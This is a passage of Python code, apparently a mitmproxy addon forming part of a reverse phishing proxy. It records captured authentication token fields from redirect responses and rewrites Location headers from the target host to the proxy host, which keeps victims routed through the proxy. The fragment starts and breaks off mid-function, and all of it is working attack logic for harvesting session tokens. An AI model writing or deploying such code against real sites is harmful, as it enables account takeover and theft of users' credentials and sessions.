            }}
            if token_fields:
                self._save({
                    "type": "tokens",
                    "timestamp": time.time(),
                    "url": flow.request.pretty_url,
                    "location": location,
                    "tokens": token_fields,
                })

            new_location = location.replace(
                f"https://{TARGET_HOST}", f"https://{PROXY_HOST}"
            ).replace(
                f"http://{TARGET_HOST}", f"https://{PROXY_HOST}"
            )
            flow.response.headers["Location"] = new_location

        try:
            text = flow.response.get_text() or ""
        except Exception:
